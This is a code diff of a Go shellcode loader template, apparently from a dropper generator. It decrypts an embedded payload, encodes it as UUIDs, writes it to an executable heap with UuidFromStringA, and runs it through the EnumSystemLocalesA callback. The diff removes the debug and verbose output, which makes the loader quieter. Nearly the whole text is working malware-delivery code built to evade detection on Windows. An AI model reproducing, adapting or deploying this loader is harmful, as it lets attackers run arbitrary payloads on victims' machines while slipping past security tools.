@@ -27,7 +27,7 @@ import (
 	"time"
 	"unsafe"
 
-	"github.com/Epictetus24/godropit/pkg/box"
+	"github.com/salukikit/go-util/pkg/box"
 
 	// Sub Repositories
 	"golang.org/x/sys/windows"
@@ -44,8 +44,6 @@ func main() {
 
 //export DoStuff
 func DoStuff() {
-	verbose := false
-	debug := false
 
 	bufstring := "{{.Bufstr}}"
 	kstring := "{{.Key}}"
@@ -57,24 +55,15 @@ func DoStuff() {
 	}
 
 	// Convert shellcode to UUIDs
-	if debug {
-		fmt.Println("[DEBUG]Converting shellcode to slice of UUIDs")
-	}
 
 	uuids, err := shellcodeToUUID(shellcode)
 	if err != nil {
 		log.Fatal(err.Error())
 	}
 
-	if debug {
-		fmt.Println("[DEBUG]Loading kernel32.dll & Rpcrt4.dll")
-	}
 	kernel32 := windows.NewLazySystemDLL("kernel32")
 	rpcrt4 := windows.NewLazySystemDLL("Rpcrt4.dll")
 
-	if debug {
-		fmt.Println("[DEBUG]Loading HeapCreate, HeapAlloc, EnumSystemLocalesA, and UuidToStringA procedures")
-	}
 	heapCreate := kernel32.NewProc("HeapCreate")
 	heapAlloc := kernel32.NewProc("HeapAlloc")
 	enumSystemLocalesA := kernel32.NewProc("EnumSystemLocalesA")
@@ -97,10 +86,6 @@ func DoStuff() {
 
 	}
 
-	if verbose {
-		fmt.Println(fmt.Sprintf("Heap created at: 0x%x", heapAddr))
-	}
-
 	/*	https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapalloc
 		DECLSPEC_ALLOCATOR LPVOID HeapAlloc(
 		HANDLE hHeap,
@@ -113,14 +98,6 @@ func DoStuff() {
 	addr, _, err := heapAlloc.Call(heapAddr, 0, 0x00100000)
 	if addr == 0 {
 		log.Fatal(fmt.Sprintf("there was an error calling the HeapAlloc function:\r\n%s", err))
-	}
-
-	if verbose {
-		fmt.Println(fmt.Sprintf("Heap allocated: 0x%x", addr))
-	}
-
-	if debug {
-		fmt.Println("[DEBUG]Iterating over UUIDs and calling UuidFromStringA...")
 	}
 
 	/*
@@ -145,9 +122,6 @@ func DoStuff() {
 
 		addrPtr += 16
 	}
-	if verbose {
-		fmt.Println("Completed loading UUIDs to memory with UuidFromStringA")
-	}
 
 	/*
 		BOOL EnumSystemLocalesA(
@@ -157,15 +131,10 @@ func DoStuff() {
 	*/
 
 	// Execute Shellcode
-	if debug {
-		fmt.Println("[DEBUG]Calling EnumSystemLocalesA to execute shellcode")
-	}
+
 	ret, _, err := enumSystemLocalesA.Call(addr, 0)
 	if ret == 0 {
 		log.Fatal(fmt.Sprintf("EnumSystemLocalesA GetLastError: %s", err))
-	}
-	if verbose {
-		fmt.Println("Executed shellcode")
 	}
 
 }
